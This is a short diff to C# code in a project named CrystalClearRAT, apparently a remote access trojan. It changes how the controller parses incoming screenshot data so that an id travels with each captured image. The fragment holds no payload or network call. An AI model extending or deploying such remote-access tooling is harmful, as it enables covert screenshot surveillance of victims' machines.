@@ -30,8 +30,9 @@ namespace CrystalClearRAT.Functions
                     GenericCommandReceived?.Invoke(null, new GenericCommandArgs(reader.ReadString()));
                     break;
                 case CommandFlags.Screenshot:
+                    string id = reader.ReadString();
                     byte[] img = reader.ReadBytes((int)(reader.BaseStream.Length - reader.BaseStream.Position));
-                    ImageReceived?.Invoke(null, new ImageArgs(img));
+                    ImageReceived?.Invoke(null, new ImageArgs(img, id));
                     break;
 
             }
